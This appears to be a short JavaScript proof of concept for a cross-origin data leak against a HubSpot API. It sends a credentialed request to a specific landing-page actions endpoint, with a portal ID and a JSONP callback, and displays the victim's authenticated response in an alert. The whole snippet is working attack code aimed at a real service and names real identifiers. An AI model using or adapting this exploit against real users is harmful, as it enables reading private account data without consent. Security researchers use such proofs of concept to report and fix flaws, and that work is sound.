window.history.replaceState(null, '', '/attacker');
var xhr = new XMLHttpRequest();

xhr.withCredentials = true;

xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
	alert(xhr.responseText);
    }
};

xhr.open("GET", "https://app-eu1.hubspot.com/content-tools-menu/api/v1/tools-menu/landing-pages/45875820775/actions?portalId=25502480&callback=jsonpHandler", true);
xhr.send();
